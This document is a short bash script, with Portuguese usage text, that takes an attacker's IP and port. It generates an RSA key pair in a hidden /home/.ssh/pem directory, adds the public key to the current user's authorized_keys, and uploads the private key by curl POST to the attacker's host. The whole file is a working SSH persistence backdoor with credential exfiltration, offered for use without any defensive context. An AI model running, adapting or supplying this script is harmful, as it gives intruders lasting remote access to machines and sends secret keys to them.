#!/bin/bash

clear

if [ "$1" == "" ] || [ "$2" == "" ]; then
        echo "Modo de uso => $0 <IP do atacante> <Porta>"
else
        echo "  [+] É necessário que o host $1 esteja aguardando o upload na porta $2"
        mkdir /home/.ssh/
        mkdir /home/.ssh/pem/
        cd /home/.ssh/pem/
        ssh-keygen -b 2048 -f rsa_id -t rsa
        cat rsa_id.pub >> ~/.ssh/authorized_keys
        curl -X POST http://$1:$2/ -F 'files=@rsa_id'
fi
